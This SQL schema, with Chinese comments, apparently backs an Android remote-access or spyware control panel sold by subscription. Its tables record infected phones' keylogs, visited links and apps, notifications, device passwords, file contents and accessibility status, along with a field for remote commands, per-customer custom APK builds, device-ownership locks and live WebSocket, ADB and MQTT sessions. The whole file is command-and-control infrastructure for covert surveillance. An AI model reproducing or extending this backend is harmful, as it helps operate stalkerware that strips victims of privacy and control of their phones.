-- 初始化数据库结构
SET NAMES utf8mb4;

CREATE TABLE IF NOT EXISTS `users` (
  `userid` varchar(20) NOT NULL,
  `usrname` varchar(100) NOT NULL,
  `profilepic` varchar(255) DEFAULT 'Prof.png',
  `email` text,
  `password` varchar(255) NOT NULL,
  `Expire` date DEFAULT NULL,
  `subtype` varchar(50) DEFAULT NULL,
  `authorty` varchar(20) DEFAULT 'user',
  `token` varchar(64) DEFAULT NULL,
  `token_expiration` datetime DEFAULT NULL,
  `hidden` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`userid`),
  KEY `idx_usrname` (`usrname`),
  KEY `idx_token` (`token`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `phones` (
  `phone_id` varchar(100) NOT NULL,
  `usrname` varchar(100) NOT NULL,
  `phone_name` varchar(255) DEFAULT NULL,
  `country` varchar(100) DEFAULT NULL,
  `address` varchar(255) DEFAULT NULL,
  `android_ver` varchar(50) DEFAULT NULL,
  `model` varchar(100) DEFAULT NULL,
  `phonepassword` varchar(255) DEFAULT NULL,
  `phonenumber` varchar(50) DEFAULT NULL,
  `wallpaper` longtext,
  `battery_charg` varchar(20) DEFAULT NULL,
  `network` varchar(50) DEFAULT NULL,
  `install_date` varchar(50) DEFAULT NULL,
  `last_ping` datetime DEFAULT NULL,
  `files_path` text,
  `files_data` longtext,
  `mob_permissions` text,
  `keylogs_dates` longtext,
  `visited_links` longtext,
  `visited_apps` longtext,
  `notifications` longtext,
  `activities` longtext,
  `phone_options` text,
  `session_id` varchar(255) DEFAULT NULL,
  `Commands` text,
  `isonline` varchar(10) DEFAULT '1',
  `isRemoved` tinyint(1) DEFAULT 0,
  `accessibility` varchar(10) DEFAULT '0',
  `phoneopen` tinyint(1) DEFAULT 1,
  PRIMARY KEY (`phone_id`),
  KEY `idx_usrname` (`usrname`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `custom_app` (
  `build_id` int(11) DEFAULT NULL,
  `user_id` varchar(20) NOT NULL,
  `app_package` varchar(255) NOT NULL,
  `app_path` varchar(500) DEFAULT NULL,
  `appname` varchar(255) DEFAULT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) DEFAULT NULL,
  `build_state` varchar(50) DEFAULT NULL,
  KEY `idx_user_app` (`user_id`, `app_package`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `suspended` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `address` varchar(100) DEFAULT NULL,
  `suspend_date` datetime DEFAULT NULL,
  `extra_info` text,
  `user_agent` text,
  `cookie_key` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `user_apps` (
  `build_id` int(11) DEFAULT NULL,
  `user_id` varchar(20) NOT NULL,
  `app_package` varchar(255) NOT NULL,
  `app_path` varchar(500) DEFAULT NULL,
  `build_date` varchar(50) DEFAULT NULL,
  `build_state` varchar(50) DEFAULT NULL,
  UNIQUE KEY `uk_user_app` (`user_id`, `app_package`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `store` (
  `app_id` varchar(255) NOT NULL,
  `main_activity` varchar(255) DEFAULT NULL,
  `app_folder` varchar(255) DEFAULT NULL,
  `appname` varchar(255) DEFAULT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`app_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `store_likes` (
  `like_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` varchar(20) DEFAULT NULL,
  `app_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`like_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ===== WS 服务端设备状态（Node.js WebSocket 实时写入） =====
CREATE TABLE IF NOT EXISTS `ws_device_status` (
  `phone_id` varchar(100) NOT NULL,
  `user_email` varchar(255) DEFAULT NULL,
  `usrname` varchar(100) DEFAULT NULL,
  `phone_name` varchar(255) DEFAULT NULL,
  `android_ver` varchar(50) DEFAULT NULL,
  `model` varchar(100) DEFAULT NULL,
  `install_date` varchar(50) DEFAULT NULL,
  `country` varchar(100) DEFAULT NULL,
  `wallpaper` longtext,
  `battery_charg` varchar(20) DEFAULT NULL,
  `activz` varchar(10) DEFAULT NULL,
  `accessibility` tinyint(1) DEFAULT 0,
  `last_ws_ping` datetime DEFAULT NULL,
  `ws_online` tinyint(1) DEFAULT 1,
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`phone_id`),
  KEY `idx_user_email` (`user_email`),
  KEY `idx_usrname` (`usrname`),
  KEY `idx_last_ws_ping` (`last_ws_ping`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `ws_device_events` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `event_time` datetime NOT NULL,
  `event_type` varchar(20) NOT NULL,
  `phone_id` varchar(100) NOT NULL,
  `user_email` varchar(255) DEFAULT NULL,
  `usrname` varchar(100) DEFAULT NULL,
  `phone_name` varchar(255) DEFAULT NULL,
  `model` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_event_time` (`event_time`),
  KEY `idx_phone_id` (`phone_id`),
  KEY `idx_usrname` (`usrname`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ===== 设备归属锁定 =====
CREATE TABLE IF NOT EXISTS `device_ownership` (
  `phone_id` varchar(100) NOT NULL,
  `usrname` varchar(100) NOT NULL,
  `user_email` varchar(255) NOT NULL,
  `locked` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`phone_id`),
  KEY `idx_usrname` (`usrname`),
  KEY `idx_user_email` (`user_email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `device_ownership_events` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `event_time` datetime NOT NULL,
  `event_type` varchar(30) NOT NULL,
  `phone_id` varchar(100) NOT NULL,
  `from_usrname` varchar(100) DEFAULT NULL,
  `to_usrname` varchar(100) DEFAULT NULL,
  `ip` varchar(64) DEFAULT NULL,
  `source` varchar(20) DEFAULT NULL,
  `note` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_event_time` (`event_time`),
  KEY `idx_phone_id` (`phone_id`),
  KEY `idx_event_type` (`event_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ===== 协议会话追踪（WS / ADB / MQTT） =====
CREATE TABLE IF NOT EXISTS `protocol_sessions` (
  `session_id` varchar(128) NOT NULL,
  `phone_id` varchar(100) NOT NULL,
  `protocol` varchar(20) NOT NULL,
  `state` varchar(20) NOT NULL,
  `version` varchar(40) DEFAULT NULL,
  `last_seen` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `expires_at` datetime NOT NULL,
  `meta` json DEFAULT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`session_id`),
  UNIQUE KEY `uniq_phone_protocol` (`phone_id`, `protocol`),
  KEY `idx_phone_state` (`phone_id`, `state`),
  KEY `idx_expires_at` (`expires_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
